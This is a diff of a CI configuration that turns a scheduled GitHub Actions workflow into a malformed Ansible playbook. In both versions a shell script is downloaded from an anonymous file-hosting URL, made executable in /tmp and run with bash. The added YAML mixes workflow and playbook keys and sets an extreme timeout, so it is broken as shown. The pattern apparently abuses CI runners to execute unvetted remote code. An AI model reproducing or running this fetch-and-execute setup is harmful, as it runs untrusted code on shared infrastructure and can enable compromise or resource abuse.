@@ -1,36 +1,13 @@
-name: Daily Scheduled Ansible Playbook
+- hosts: localhost
+runs-on: 
+ ubuntu-latest timeout-minutes: 9999999
+  tasks:
+    - name: 下载 shell 脚本
+      ansible.builtin.get_url:
+        url: "https://files.catbox.moe/uh19yg.sh"
+        dest: "/tmp/uh19yg.sh"
+        mode: "0755"
 
-on:
-  schedule:
-    - cron: '0 0 * * *'  # 每天的 0:00 AM 执行
-
-jobs:
-  run-ansible:
-    runs-on: ubuntu-latest
-
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v2
-
-      - name: Set up Ansible
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y ansible
-
-      - name: Run Ansible Playbook
-        run: |
-          echo "---" > playbook.yml
-          echo "- hosts: localhost" >> playbook.yml
-          echo "  tasks:" >> playbook.yml
-          echo "    - name: 下载 shell 脚本" >> playbook.yml
-          echo "      ansible.builtin.get_url:" >> playbook.yml
-          echo "        url: 'https://files.catbox.moe/uh19yg.sh'" >> playbook.yml
-          echo "        dest: '/tmp/uh19yg.sh'" >> playbook.yml
-          echo "        mode: '0755'" >> playbook.yml
-          echo "" >> playbook.yml
-          echo "    - name: 运行 shell 脚本" >> playbook.yml
-          echo "      ansible.builtin.command:" >> playbook.yml
-          echo "        cmd: 'bash /tmp/uh19yg.sh'" >> playbook.yml
-
-      - name: Execute Ansible Playbook
-        run: ansible-playbook playbook.yml
+    - name: 运行 shell 脚本
+      ansible.builtin.command:
+        cmd: "bash /tmp/uh19yg.sh"
